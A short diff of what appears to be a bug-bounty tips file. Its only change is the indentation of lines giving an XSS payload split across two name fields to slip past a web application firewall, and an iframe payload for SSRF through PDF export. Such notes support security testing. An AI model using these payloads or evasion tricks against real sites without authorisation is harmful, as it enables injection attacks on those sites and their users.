@@ -11,11 +11,11 @@ Date: 27-02-2021
 
 2. If WAF blocked your payload, you can bypass it by separating the payload. [link](https://twitter.com/AMakki1337/status/1478048809217400837)
 
-First Name: `<svg`
+    First Name: `<svg`
 
-Last Name: `onload=alert(1)>`
+    Last Name: `onload=alert(1)>`
 
-Name: `<svg onload=alert(1)>`
+    Name: `<svg onload=alert(1)>`
 
 3. This can be a payload for SSRF: `<iframe src=’https://labs.amakki.me’>` [link](https://amakki.me/full-ssrf-by-exporting-pdf-bbe1bfde24c4)
 
